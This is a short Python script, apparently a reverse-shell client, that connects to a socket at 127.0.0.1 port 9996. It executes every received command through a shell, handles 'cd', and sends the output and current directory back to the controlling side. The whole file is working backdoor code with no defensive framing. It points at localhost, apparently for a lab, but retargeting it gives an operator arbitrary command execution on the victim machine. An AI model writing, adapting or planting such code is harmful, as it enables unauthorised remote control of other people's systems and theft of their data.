import socket
import os
import subprocess

sock = socket.socket()
host = '127.0.0.1'
port = 9996

sock.connect((host, port))

while True:
    data = sock.recv(1024)
    # Check if first two characters of data is 'cd'
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    # Check for other commands
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + "> "
        # Send encoded cmd output to server
        sock.send(str.encode(output_str + currentWD))
        # Print decoded cmd output
        print(output_str)
